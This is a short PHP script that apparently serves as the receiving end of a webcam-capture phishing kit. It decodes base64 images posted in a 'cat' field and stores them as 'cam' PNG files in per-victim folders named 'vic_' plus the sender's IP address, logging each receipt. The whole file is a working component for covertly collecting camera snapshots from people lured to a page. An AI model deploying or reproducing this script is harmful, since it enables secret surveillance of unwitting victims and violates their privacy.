<?php
include 'ip.php';
$date = date('dMYHis');
$imageData=$_POST['cat'];

if (!empty($_POST['cat'])) {
error_log("Received" . "\r\n", 3, "Log.log");

}
if (!is_dir( "images") ) {
    mkdir( "images");       
}
if (!is_dir( "images/vic_".$ipaddress) ) {
    mkdir( "images/vic_".$ipaddress );       
} 

$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( 'images/vic_'.$ipaddress.'/cam'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );

exit();
?>

